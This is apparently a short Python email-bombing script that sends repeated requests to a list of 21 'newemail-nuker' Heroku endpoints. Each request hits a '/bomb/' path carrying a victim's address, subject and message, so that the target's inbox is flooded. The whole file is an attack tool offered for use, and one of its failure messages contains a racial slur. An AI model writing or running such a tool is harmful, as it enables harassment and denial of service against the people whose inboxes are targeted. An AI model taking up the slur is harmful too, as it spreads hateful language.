import random
import requests

import asyncio
import aiohttp

server_list = [
    "https://newemail-nuker.herokuapp.com/1",
    "https://newemail-nuker.herokuapp.com/2",
    "https://newemail-nuker.herokuapp.com/3",
    "https://newemail-nuker.herokuapp.com/4",
    "https://newemail-nuker.herokuapp.com/5",
    "https://newemail-nuker.herokuapp.com/6",
    "https://newemail-nuker.herokuapp.com/7",
    "https://newemail-nuker.herokuapp.com/8",
    "https://newemail-nuker.herokuapp.com/9",
    "https://newemail-nuker.herokuapp.com/10",
    "https://newemail-nuker.herokuapp.com/11",
    "https://newemail-nuker.herokuapp.com/12",
    "https://newemail-nuker.herokuapp.com/13",
    "https://newemail-nuker.herokuapp.com/14",
    "https://newemail-nuker.herokuapp.com/15",
    "https://newemail-nuker.herokuapp.com/16",
    "https://newemail-nuker.herokuapp.com/17",
    "https://newemail-nuker.herokuapp.com/18",
    "https://newemail-nuker.herokuapp.com/19",
    "https://newemail-nuker.herokuapp.com/20",
    "https://newemail-nuker.herokuapp.com/21"
]

async def allah(email, subject, message, amount):
    send_amount = 0
    for i in range(amount):
        async with aiohttp.ClientSession() as session:
            server = random.choice(server_list)

            async with session.get(
                f'{server}/bomb/{email}/{subject}/{message}'
            ) as response:

                send_mail = await response.text()

            if send_mail == 'Sent':
                send_amount +=1
                print(f'sent {send_amount}')

            else:
                print('nigga failed to send')
                pass

    if send_amount != 0:
        return(
            f'Successfully sent emails to: {email}',
            f'{send_amount} Sent successfully\n{amount-send_amount} Failed to send'
        )

    else:
        return(
            f'Failed to send emails',
            f'Could not send emails to {email}'
        )
